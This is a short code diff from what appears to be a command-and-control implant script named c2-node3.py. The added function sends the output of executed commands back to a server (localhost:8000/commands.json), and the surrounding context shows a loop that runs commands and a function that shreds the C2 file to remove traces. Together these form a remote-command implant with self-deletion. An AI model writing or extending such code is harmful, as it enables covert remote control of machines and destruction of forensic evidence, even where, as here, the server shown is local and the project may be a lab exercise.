@@ -15,6 +15,12 @@ def mainloop():
             output = stdout_stderr.read() # wait until child process terminates
             print(output)
 
+def response(output):
+    """respond to the server"""
+    request = urllib.request.Request("http://localhost:8000/commands.json",
+        output)
+    urllib.request.urlopen(request) # sends the request
+
 def shredC2():
     """shreds the file c2-node3.py"""
     try:
